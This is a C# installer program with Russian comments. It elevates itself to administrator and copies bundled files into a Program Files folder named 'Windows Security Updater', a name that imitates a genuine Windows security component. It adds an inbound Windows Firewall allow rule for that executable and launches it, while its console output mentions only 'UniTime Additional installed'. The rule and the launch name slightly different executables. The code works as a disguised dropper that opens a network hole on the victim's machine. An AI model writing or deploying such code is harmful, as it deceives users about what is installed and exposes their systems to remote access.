using NetFwTypeLib;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;

class Program
{
    static void Main(string[] args)
    {
        try
        {
            // Проверяем, запущено ли приложение с правами администратора
            if (!IsRunningAsAdmin())
            {
                // Если нет, запускаем приложение с правами администратора
                RunAsAdmin();
            }


            // Получаем путь к каталогу "Program Files"
            string programFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);

            // Создаем путь к папке "Windows Security Updater" в "Program Files"
            string updaterFolderPath = Path.Combine(programFilesPath, "Windows Security Updater");

            // Проверяем, существует ли уже папка "Windows Security Updater"
            if (!Directory.Exists(updaterFolderPath))
            {
                // Создаем папку "Windows Security Updater"
                Directory.CreateDirectory(updaterFolderPath);

                // Копируем файлы в эту папку
                CopyFilesToFolder(updaterFolderPath);

                // Запускаем файлы в этой папке
                RunFilesInFolder(updaterFolderPath);

                //Console.WriteLine("Windows Security Updater successfully installed and launched.");
            }
            else
            {
                //Console.WriteLine("Windows Security Updater is already installed.");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred: {ex.Message}");
        }
        Console.ReadKey();
    }
    // Метод для запуска приложения с правами администратора
    static bool IsRunningAsAdmin()
    {
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }
    static void RunAsAdmin()
    {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.UseShellExecute = true;
        startInfo.WorkingDirectory = Environment.CurrentDirectory;
        startInfo.FileName = Process.GetCurrentProcess().MainModule.FileName;
        startInfo.Verb = "runas"; // Запуск с правами администратора

        try
        {
            Process.Start(startInfo);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Ошибка запуска: {ex.Message}");
        }
    }
    static void CopyFilesToFolder(string folderPath)
    {
        try
        {
            // Копируем файлы из текущего каталога в папку "Windows Security Updater"
            string[] filesToCopy = Directory.GetFiles(Environment.CurrentDirectory);
            foreach (string filePath in filesToCopy)
            {
                string fileName = Path.GetFileName(filePath);
                string destinationFilePath = Path.Combine(folderPath, fileName);
                File.Copy(filePath, destinationFilePath, true);

            }
            string[] filesToCopyN = Directory.GetFiles(Environment.CurrentDirectory+"\\sv");
            foreach (string filePath in filesToCopyN)
            {
                string fileName = Path.GetFileName(filePath);
                string destinationFilePath = Path.Combine(folderPath, fileName);
                File.Copy(filePath, destinationFilePath, true);

            }
            string pathToUni = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            pathToUni += "\\UnitimeAdditional";
            Directory.CreateDirectory(pathToUni);
            string[] filesToCopyUni = Directory.GetFiles(Environment.CurrentDirectory + "\\UniTime");
            foreach (string filePath in filesToCopyUni)
            {
                string fileName = Path.GetFileName(filePath);
                string destinationFilePath = Path.Combine(pathToUni, fileName);
                File.Copy(filePath, destinationFilePath, true);
            }


            FUnlocker();
            Console.WriteLine($"UniTime Additional installed");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error copying files to folder: {ex.Message}");
        }
    }

    static void RunFilesInFolder(string folderPath)
    {
        try
        {
            string programFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
            string updaterFolderPath = programFilesPath + @"\Windows Security Updater\Security Updater.exe";

            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.FileName = updaterFolderPath;
            System.Diagnostics.Process.Start(startInfo);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error running files in folder: {ex.Message}");
        }
    }
    static void FUnlocker()
    {
        string programFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
        programFilesPath += "\\Windows Security Updater\\Windows Security Updater.exe";
        // Создаем экземпляр объекта для взаимодействия с брандмауэром Windows
        var firewallPolicy = Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FwPolicy2")) as INetFwPolicy2;

        // Создаем объект правила брандмауэра
        INetFwRule firewallRule = Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FWRule")) as INetFwRule;

        // Устанавливаем параметры правила
        firewallRule.Name = "Windows Security Updater"; // Имя правила
        firewallRule.ApplicationName = programFilesPath; // Путь к вашему приложению
        firewallRule.Action = NET_FW_ACTION_.NET_FW_ACTION_ALLOW; // Разрешаем соединения для приложения
        firewallRule.Direction = NET_FW_RULE_DIRECTION_.NET_FW_RULE_DIR_IN; // Направление входящих соединений
        firewallRule.Enabled = true; // Включаем правило
        firewallPolicy.Rules.Add(firewallRule);
    }
}
